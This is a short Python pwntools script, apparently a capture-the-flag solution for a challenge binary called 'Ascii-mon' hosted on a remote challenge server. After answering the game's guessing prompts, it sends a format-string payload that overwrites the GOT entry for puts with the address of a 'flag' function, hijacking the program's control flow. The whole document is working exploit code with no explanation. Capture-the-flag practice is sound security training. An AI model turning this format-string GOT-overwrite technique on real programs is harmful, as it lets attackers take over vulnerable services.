from pwn import *
exe = context.binary = ELF("Ascii-mon")
io = remote("0.cloud.chals.io", "30647")
exitaddr = exe.got['puts']
winaddr = exe.symbols['flag']
def sendPayload(payload):
    io = remote("0.cloud.chals.io", "30647")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(b"Gengar")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(b"Typhlosion")
    io.recvuntil(b"(Yes/No):")
    io.sendline(b"Yes")
    io.recvuntil(b'Enter your guess: ')
    io.sendline(payload)
    back = io.recvuntil(b'Sorry, that\'s wrong. Try again next time.')
    return back

fmt = FmtStr(execute_fmt=sendPayload, offset=6)
fmt.write(exitaddr, winaddr)
fmt.execute_writes()